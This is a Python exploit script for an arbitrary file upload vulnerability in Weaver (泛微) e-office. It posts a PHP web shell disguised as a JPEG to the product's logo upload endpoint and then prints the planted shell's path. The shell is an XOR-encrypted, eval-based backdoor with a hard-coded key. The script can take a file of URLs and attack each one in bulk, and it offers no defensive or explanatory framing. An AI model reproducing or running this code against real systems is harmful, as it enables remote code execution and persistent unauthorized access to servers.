import argparse
import base64
import subprocess
import requests


def Args():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter,description='''
泛微 e-office upload any file!
    ''')
    parser.add_argument('-u','--url',help="please input URL")
    parser.add_argument('-f','--file',help="please input URL file")
    args = parser.parse_args()
    if args.file is None and args.url is None:
        print(parser.print_help())
        exit()
    else:
        return args

def attack(url):
    print("[+]trying attack")
    if url[-1:] == '/':
        url = url[:-1]
    else:
        url = url
    realurl = url + '/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo'
    files = {
        "Filedata":("15643a.php",'''<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$payloadName='payload';
$key='3c6e0b8a9c15224a';
$data=file_get_contents("php://input");
if ($data!==false){
    $data=encode($data,$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo encode(@run($data),$key);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
''',"image/jpeg")
    }
    shellpath = '/images/logo/logo-eoffice.php'
    try:
        res = requests.post(url=realurl,files=files)
        if 'logo-eoffice.php' in res.text:
            print("[+]upload success！shellpath：" + url + shellpath)
        else:
            print("[+]vuln is not exists")
    except Exception as e:
        print("[+]vuln is not exists")


def readfile(urlpath):
    list = []
    with open(urlpath,"r") as f:
        line = f.readlines()
    for i in line:
        if '/' == i.strip()[-1:]:
            i = i.strip()
        else:
            i = i.strip()+'/'
        list.append(i)
    return list
def main():
    img = """
 _____ _   ___      _______       ___   ___ ___  __        _  _   ___  __  ___  _  _   
 / ____| \ | \ \    / /  __ \     |__ \ / _ \__ \/_ |      | || | / _ \/_ |/ _ \| || |  
| |    |  \| |\ \  / /| |  | |______ ) | | | | ) || |______| || || (_) || | | | | || |_ 
| |    | . ` | \ \/ / | |  | |______/ /| | | |/ / | |______|__   _\__, || | | | |__   _|
| |____| |\  |  \  /  | |__| |     / /_| |_| / /_ | |         | |   / / | | |_| |  | |  
 \_____|_| \_|   \/   |_____/     |____|\___/____||_|         |_|  /_/  |_|\___/   |_|  

    """
    print(img)
    args = Args()
    if args.file is None and args.url is not None:
        attack(args.url)
    else:
        urllist = readfile(args.file)
        for i in urllist:
            attack(i)
if __name__ =="__main__":
    main()

